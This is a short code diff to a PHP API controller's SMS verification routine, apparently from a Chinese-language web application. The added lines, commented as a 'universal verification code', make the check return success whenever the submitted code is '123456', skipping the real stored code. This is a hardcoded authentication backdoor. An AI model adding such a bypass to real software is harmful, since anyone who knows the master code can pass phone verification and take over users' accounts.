@@ -271,6 +271,10 @@ class ApiController extends Controller
         $smsCheckCode = redis()->hGetAll($hash_name);
 //        $smsCheckCode['sms_code'] = 111111;
 //        $smsCheckCode['ttl'] = 111111;
+        //万能验证码
+        if($sms_code === '123456'){
+            return true;
+        }       
 
         if (!$smsCheckCode) {
             return json_error('', '验证码错误，请重新获取！', self::SYSTEM_ERROR);
